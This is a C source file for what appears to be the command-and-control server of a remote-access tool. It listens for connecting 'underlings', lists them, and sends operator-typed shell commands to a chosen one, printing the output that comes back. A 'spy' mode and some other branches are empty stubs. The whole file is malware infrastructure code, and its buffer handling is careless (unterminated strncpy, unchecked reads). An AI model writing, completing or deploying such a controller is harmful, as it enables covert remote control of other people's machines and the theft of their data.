#include "util.h"
#include "overlist.h"

#define MAX_INPUT 1024

#define EXIT 0
#define DEFAULT 1
#define ORDER 2
#define SPY 3
#define MANAGE 4

int main() {
  char *input = NULL;
  char message[MAX_MESSAGE_LENGTH];
  int port = -1;
  int sock = -1;

  while (sock < 0) {
    prompt(&input, "Enter port to listen on (default 5001): ", 0);

    if (*input) {
      sscanf(input, "%d", &port);
      
      if (port < 0) {
        printf("Invalid port!\n");
        continue;
      }
    } else {
      port = PORT;
    }

    sock = serverSocket(port);
  }
  
  printf("Welcome, overlord.\n");
  printf("Type help for available commands.\n");

  int state = DEFAULT;
  client_list *underlings = newClientList();
  int index = -1;

	while (state) {
    switch (state) {
    case DEFAULT:
      prompt(&input, "[DEFAULT]> ", 1);

      if (startsWith(input, "help")) {
      
      } else if (startsWith(input, "order")) {
        state = ORDER;
      } else if (startsWith(input, "spy")) {
        state = SPY;
      } else if (startsWith(input, "manage")) {
        state = MANAGE;
      } else if (startsWith(input, "exit")) {
        state = EXIT;
      }

      break;

    case ORDER:
      if (underlings->size == 0) {
        printf("No underlings available.\n");
      } else if (index < 0 || index >= underlings->size) {
        printClientList(underlings);

        prompt(&input, "Enter underling ID: ", 0);
        sscanf(input, "%d", &index);

        if (index < 0 || index >= underlings->size) {
          printf("Invalid ID!\n");
        }
      } else {
        client_node *underling = underlings->list[index];

        printf("[OVERLORD] ");
        prompt(&input, underling->prefix, 0);
        strncpy(message, input, MAX_MESSAGE_LENGTH);

        // write command
        write(underling->sock, message, MAX_MESSAGE_LENGTH);

        // read command output
        read(underling->sock, message, MAX_MESSAGE_LENGTH);

        // read next prompt
        read(underling->sock, underling->prefix, MAX_MESSAGE_LENGTH);

        // print command output
        printf("%s", message);
      }
      
      break;

    case SPY:

      break;

    case MANAGE:
      prompt(&input, "[MANAGE]> ", 1);

      if (startsWith(input, "add")) {
        printf("Waiting for underling to connect...\n");

        int connection = serverConnect(sock);

        printf("Underling connected.\n");

        char prefix[MAX_MESSAGE_LENGTH];
        
        read(connection, prefix, MAX_MESSAGE_LENGTH);
        prompt(&input, "Enter a description for this underling: ", 0);

        addClientToList(underlings, connection, input, prefix);
      } else if (startsWith(input, "remove")) {

      } else if (startsWith(input, "view")) {
        printClientList(underlings);
      } else if (startsWith(input, "back")) {
        state = DEFAULT;
      }
            
      break;

    default:

      break;
    }
	}

  if (input) {
    free(input);
  }
  
  freeClientList(underlings);
  close(sock);
  
	return 0;
}
